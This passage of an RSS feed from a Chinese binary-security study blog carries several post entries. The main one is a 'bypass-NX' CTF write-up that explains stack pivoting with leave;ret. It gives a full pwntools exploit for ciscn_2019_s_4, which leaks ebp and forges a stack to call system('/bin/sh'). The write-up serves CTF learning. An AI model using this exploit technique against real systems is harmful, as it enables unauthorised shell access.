&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9maXJtaWFuYXkuZ2l0Ym9va3MuaW8vY3RmLWFsbC1pbi1vbmUvY29udGVudC9kb2MvNC4xNF9nbGliY190Y2FjaGUuaHRtbCNjdGYtJUU1JUFFJTlFJUU0JUJFJThC&#34;&gt;https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/4.14_glibc_tcache.html#ctf-%E5%AE%9E%E4%BE%8B&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92MWNreWR4cC5naXRodWIuaW8vMjAxOS8wNi8zMC9UY2FjaGUtJUU2JTlDJUJBJUU1JTg4JUI2JUU1JTg4JTg2JUU2JTlFJTkwJUU1JThGJThBJUU1JTg4JUE5JUU3JTk0JUE4JUU2JTgwJTlEJUU4JUI3JUFGLw==&#34;&gt;https://v1ckydxp.github.io/2019/06/30/Tcache-%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;堆利用例题&#34;&gt;&lt;a href=&#34;#堆利用例题&#34; class=&#34;headerlink&#34; title=&#34;堆利用例题&#34;&gt;&lt;/a&gt;堆利用例题&lt;/h2&gt;&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvc3lzdGVtLzE3MTI2MS5odG1s&#34;&gt;https://www.freebuf.com/articles/system/171261.html&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;fastbin-dup-into-stack&#34;&gt;&lt;a href=&#34;#fastbin-dup-into-stack&#34; class=&#34;headerlink&#34; title=&#34;fastbin_dup_into_stack&#34;&gt;&lt;/a&gt;fastbin_dup_into_stack&lt;/h3&gt; ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://alazymechnaic.github.io/2023/05/05/bypass-aslr/</guid>
            <title>bypass-aslr</title>
            <link>https://alazymechnaic.github.io/2023/05/05/bypass-aslr/</link>
            <pubDate>Fri, 05 May 2023 10:29:48 +0800</pubDate>
            <description><![CDATA[  ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://alazymechnaic.github.io/2023/05/02/cfi-sec/</guid>
            <title>CFI-Sec</title>
            <link>https://alazymechnaic.github.io/2023/05/02/cfi-sec/</link>
            <pubDate>Tue, 02 May 2023 18:21:39 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;Finding-Cracks-in-Shields-On-the-Security-of-Control-Flow-Integrity-Mechanisms&#34;&gt;&lt;a href=&#34;#Finding-Cracks-in-Shields-On-the-Security-of-Control-Flow-Integrity-Mechanisms&#34; class=&#34;headerlink&#34; title=&#34;Finding Cracks in Shields:On the Security of Control Flow Integrity Mechanisms&#34;&gt;&lt;/a&gt;Finding Cracks in Shields:On the Security of Control Flow Integrity Mechanisms&lt;/h2&gt;&lt;hr&gt;
&lt;p&gt;&lt;img data-src=&#34;https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202305042048279.png&#34; alt=&#34;image-20230502185448539&#34;&gt;&lt;/p&gt;
&lt;p&gt;​	最早的CFI机制在2005年被提出，后续又出现了各种各样的CFI，但是有一点就是这些机制都不能给予程序绝对的控制流安全性。通常的做法是给ICT（indirect control transfer）指令施加监视器，一个ICT可能存在多个合法的跳转目标，但是在每次执行的时候只能跳转到一个确定的位置。（因此最理想的情况就是每条跳转指令只能有一个确定的跳转位置）&lt;/p&gt;
&lt;p&gt;​	当前的任何CFI控制流安全策略都需要解决以下几个问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如何让claimed boundary和real boundary match？&lt;/li&gt;
&lt;li&gt;有些可行的目标组合依然会导致漏洞利用（这不就是DOP么？）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;然后这个文章后面讲了评估CFI方案好坏的方法，等用到的时候再看&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://alazymechnaic.github.io/2023/05/02/bypass-nx/</guid>
            <title>bypass-NX</title>
            <link>https://alazymechnaic.github.io/2023/05/02/bypass-nx/</link>
            <category>bypass</category>
            <pubDate>Tue, 02 May 2023 14:56:58 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;Bypass-NX（DEP）&#34;&gt;&lt;a href=&#34;#Bypass-NX（DEP）&#34; class=&#34;headerlink&#34; title=&#34;Bypass NX（DEP）&#34;&gt;&lt;/a&gt;Bypass NX（DEP）&lt;/h2&gt;&lt;h3 id=&#34;简介&#34;&gt;&lt;a href=&#34;#简介&#34; class=&#34;headerlink&#34; title=&#34;简介&#34;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;​	栈不可执行（NX），其实也称为DEP(Data Execution PreventionData Execution Prevention),用于防止在栈上执行代码，当该保护开启时，会触发程序的&lt;strong&gt;SIGSEGV&lt;/strong&gt; 错误。这里需要注意的一点为，开启该选项后，不只是栈段，数据段（堆段）依然处于不可执行的状态。&lt;/p&gt;
&lt;h3 id=&#34;绕过&#34;&gt;&lt;a href=&#34;#绕过&#34; class=&#34;headerlink&#34; title=&#34;绕过&#34;&gt;&lt;/a&gt;绕过&lt;/h3&gt;&lt;p&gt;​	既然无法将shellcode注入到数据段上并执行，那就只能修改IP指向已有的代码部分。例如采用技术 Return-to-libc,修改当前的EIP指针向已有的库函数，并且传递相应的参数。（&lt;strong&gt;如果在开启了NX的情况下如何进行单字节溢出的利用&lt;/strong&gt;）。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;least privilege &amp;amp; seteuid(getuid())&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​	在实际的应用程序中会采用最小特权原则，并且能够进行权限继承，因此，攻击者能够获取与当前程序相同权限的shell，但在程序中可以通过setuid的方式主动放弃不必要的权限。因此，如果想要获得更高权限的shell需要构造以下调用序列：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-c&#34; data-language=&#34;c&#34;&gt;&lt;code class=&#34;language-c&#34;&gt;&lt;span class=&#34;token function&#34;&gt;seteuid&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;“sh”&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;但是存在问题，setuid的参数是\x00，但是strcpy在遇到\x00后会自动停止，并不能将其拷贝到栈中。因此需要使用到两个技术：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ESP lifting (ESP抬升)&lt;/li&gt;
&lt;li&gt;Frame Faking(栈帧伪造)&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zcGxvaXRmdW4ud29yZHByZXNzLmNvbS8yMDE1LzA1LzA4L2J5cGFzc2luZy1ueC1iaXQtdXNpbmctY2hhaW5lZC1yZXR1cm4tdG8tbGliYy8=&#34;&gt;https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其实二者是一个东西，本质是和之前的单字节溢出，利用leave | ret指令实现栈抬升相同，主要使用leave和ret两个指令：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-assembly&#34; data-language=&#34;assembly&#34;&gt;&lt;code class=&#34;language-assembly&#34;&gt;leave:
        move esp,ebp ; 恢复栈顶指针
        pop ebp ;(esp=esp+4)&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;栈迁移的本质是重新构造出进入jmp system_got 时的栈情况，最终目的是将esp迁移过来。但是需要注意的一点是，一次leave ret指令智能将esp抬升上去，并不能对ebp做任何操作，因此需要进行两次leave ret指令，第一个ret不能返回到system而是找到gadget：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-assembly&#34; data-language=&#34;assembly&#34;&gt;&lt;code class=&#34;language-assembly&#34;&gt;esp,ebp --&amp;gt; old_ebp
        --&amp;gt; ret_addr
        --&amp;gt; arg1 :此处是指向system字符串参数的指针
&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;hr&gt;
&lt;h3 id=&#34;例题-ciscn-2019-s-4&#34;&gt;&lt;a href=&#34;#例题-ciscn-2019-s-4&#34; class=&#34;headerlink&#34; title=&#34;例题 ciscn_2019_s_4&#34;&gt;&lt;/a&gt;例题 ciscn_2019_s_4&lt;/h3&gt;&lt;p&gt;&lt;img data-src=&#34;https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202305042048537.png&#34; alt=&#34;image-20230504193243253&#34;&gt;&lt;/p&gt;
&lt;p&gt;题目很简单，buff的长度有40，但是read函数长度有48，多出八个字节能够溢出。总体思路是进行rop，但是由于溢出长度有限，在vul函数退出后进行了清理堆栈的操作，导致后面的内容不可控，因此需要进行栈迁移，将更多的栈部分可控。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202305042048754.png&#34; alt=&#34;image-20230504193612815&#34;&gt;&lt;/p&gt;
&lt;p&gt;在32位程序下，栈按照四个字节进行对齐，因此溢出的八个字节能够覆盖ebp指针和ret地址。一个函数在执行leave | ret之前的状态如下：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-assembly&#34; data-language=&#34;assembly&#34;&gt;&lt;code class=&#34;language-assembly&#34;&gt;esp -&amp;gt; [???] ; 此时的esp指针可能会指向栈中的任意位置
...
ebp -&amp;gt; [old_ebp] ; 这里是记录父函数的栈基址，由刚进子函数的时候push ebp指令存储至此
	   [ret_add] ; 记录当前的返回地址&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;上述经过栈溢出后，old_ebp和ret_addr被覆盖为new_ebp, new_ret_addr,在执行leave ret指令后的栈空间：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-assembly&#34; data-language=&#34;assembly&#34;&gt;&lt;code class=&#34;language-assembly&#34;&gt;inst: 
	mov esp,ebp
----------------------------------------------
ebp,esp -&amp;gt; [new_ebp] ; 这里是记录父函数的栈基址，由刚进子函数的时候push ebp指令存储至此
	   [new_ret_addr] ; 记录当前的返回地址
----------------------------------------------
inst: 
	pop ebp
----------------------------------------------
ebp = buff_(new_ebp) ; 指向新的栈位置,这里位置的构造进行后续讨论
esp -&amp;gt; [new_ret_addr] ; 记录当前的返回地址&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;但是注意此时还并没有完全将栈迁移出去。此时的esp还在低位，如果直接将new_ret_addr覆盖为system，则此时索引的arg参数是esp + 0x4（因为在执行过call函数后，压入了call system的下一个地址），比esp地址更高的位置显然是不可控的（注意这里，栈是向低地址增长的，新函数的参数由父函数压入，因此在高地址）。需要将esp进行同样的抬升。因此需要再次执行leave ret指令继续修改。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-assembly&#34; data-language=&#34;assembly&#34;&gt;&lt;code class=&#34;language-assembly&#34;&gt;inst: 
	mov esp,ebp
----------------------------------------------
ebp,esp = buff_ ; 执行结束后完成将esp的抬升
----------------------------------------------
inst: 
	pop ebp
----------------------------------------------
esp = buff_ ;  
ebp = Any ;   pop ebp执行后会改变ebp，但是对后续的利用来说，ebp指向哪里并没有影响,因为子函数只基于esp进行索引&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;所以该题目的思路也逐渐清晰，就是要通过溢出将esp抬升。抬升前需要指导buff的地址，也就是esp应该抬升到哪里去，本题还需要用到的部分是&lt;strong&gt;printf&lt;/strong&gt;本身在输出的时候接收一个字符串指针，并自动执行到\x00的位置结束。因此可以利用该机制进行ebp的泄露。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;
sh &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; process&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;./ciscn_s_4&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
elf&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;ELF&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;./ciscn_s_4&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
context&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;os &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;linux&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;arch &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;amd64&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;log_level &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;debug&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
	静态查找leave ret指令地址
&#39;&#39;&#39;&lt;/span&gt;
system_addr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x8048400&lt;/span&gt;
leave_ret_addr&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x080484B8&lt;/span&gt;
ret_addr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;system_addr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
	第一次直接构造和buff长度相同的输入，printf时会输出后续内容
&#39;&#39;&#39;&lt;/span&gt;
payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;a&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x28&lt;/span&gt;
sh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;name?\n&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
sh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;send&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
	接收泄露的ebp输出
&#39;&#39;&#39;&lt;/span&gt;
sh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x28&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
ebp &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; u32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ljust&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;\x00&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
	这里泄露出ebp后只能做基于ebp的偏移，将ebp偏移到buff的位置。当程序的控制流的确定时，其栈帧的相对位置也是确定的，因此可以直接在动态调试的过程中获取ebp和buff的位置，直接相减得到偏移量为0x38
&#39;&#39;&#39;&lt;/span&gt;
fake_ebp &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ebp &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x38&lt;/span&gt;
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
	构造第二次输入的payload
&#39;&#39;&#39;&lt;/span&gt;
payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;system_addr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# ret addr&lt;/span&gt;
payload&lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;aaaa&#39;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# junk ret addr 用于模拟call system时的压入返回值操作&lt;/span&gt;
payload&lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;fake_ebp&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# 指向system参数的指针，这里注意，system传入的不是一个字符串而是一个指针&lt;/span&gt;
payload&lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;/bin/sh\x00&#39;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# payload&lt;/span&gt;
payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ljust&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x28&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;A&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# 这里对当前的栈进行补齐操作&lt;/span&gt;
payload&lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;fake_ebp&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# 该位置会作为新的栈顶更高的位置，在执行第二次leave ret指令时会进行一次pop ebp&lt;/span&gt;
payload&lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;leave_ret_addr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# 填入leave ret返回值&lt;/span&gt;
sh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;send&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
sh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
exit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;注意两个关键位置：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;payload+=p32(fake_ebp+12) # 指向system参数的指针，这里注意，system传入的不是一个字符串而是一个指针&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;payload+=p32(fake_ebp-4) # 该位置会作为新的栈顶更高的位置，在执行第二次leave ret指令时会进行一次pop ebp&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;参考&#34;&gt;&lt;a href=&#34;#参考&#34; class=&#34;headerlink&#34; title=&#34;参考&#34;&gt;&lt;/a&gt;参考&lt;/h3&gt;&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NlYV90aW1lL2FydGljbGUvZGV0YWlscy8xMDYxNDI5NzE=&#34;&gt;https://blog.csdn.net/sea_time/article/details/106142971&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zcGxvaXRmdW4ud29yZHByZXNzLmNvbS8yMDE1LzA1LzA4L2J5cGFzc2luZy1ueC1iaXQtdXNpbmctY2hhaW5lZC1yZXR1cm4tdG8tbGliYy8=&#34;&gt;https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/&lt;/span&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://alazymechnaic.github.io/2023/05/02/personal-plan/</guid>
            <title>personal_plan</title>
            <link>https://alazymechnaic.github.io/2023/05/02/personal-plan/</link>
            <category>personal</category>
            <pubDate>Tue, 02 May 2023 14:30:16 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;技术路线&#34;&gt;&lt;a href=&#34;#技术路线&#34; class=&#34;headerlink&#34; title=&#34;技术路线&#34;&gt;&lt;/a&gt;技术路线&lt;/h1&gt;&lt;p&gt;​	本文用于对当前的栈中的内容和未学习内容进行索引。&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0NIWWJldGEvU29mdHdhcmUtU2VjdXJpdHktTGVhcm5pbmc=&#34;&gt;https://github.com/CHYbeta/Software-Security-Learning&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;二进制安全&#34;&gt;&lt;a href=&#34;#二进制安全&#34; class=&#34;headerlink&#34; title=&#34;二进制安全&#34;&gt;&lt;/a&gt;二进制安全&lt;/h2&gt;&lt;h3 id=&#34;Windows&#34;&gt;&lt;a href=&#34;#Windows&#34; class=&#34;headerlink&#34; title=&#34;Windows&#34;&gt;&lt;/a&gt;Windows&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;SEH机制&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;Linux&#34;&gt;&lt;a href=&#34;#Linux&#34; class=&#34;headerlink&#34; title=&#34;Linux&#34;&gt;&lt;/a&gt;Linux&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;One byte overflow&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;安卓安全&#34;&gt;&lt;a href=&#34;#安卓安全&#34; class=&#34;headerlink&#34; title=&#34;安卓安全&#34;&gt;&lt;/a&gt;安卓安全&lt;/h2&gt;&lt;h2 id=&#34;渗透实战&#34;&gt;&lt;a href=&#34;#渗透实战&#34; class=&#34;headerlink&#34; title=&#34;渗透实战&#34;&gt;&lt;/a&gt;渗透实战&lt;/h2&gt;&lt;h3 id=&#34;后渗透&#34;&gt;&lt;a href=&#34;#后渗透&#34; class=&#34;headerlink&#34; title=&#34;后渗透&#34;&gt;&lt;/a&gt;后渗透&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;CTF-WP&#34;&gt;&lt;a href=&#34;#CTF-WP&#34; class=&#34;headerlink&#34; title=&#34;CTF WP&#34;&gt;&lt;/a&gt;CTF WP&lt;/h2&gt; ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://alazymechnaic.github.io/2023/04/27/one-byte-overflow/</guid>
            <title>one_byte_overflow</title>
            <link>https://alazymechnaic.github.io/2023/04/27/one-byte-overflow/</link>
            <category>binary</category>
            <pubDate>Thu, 27 Apr 2023 19:40:42 +0800</pubDate>
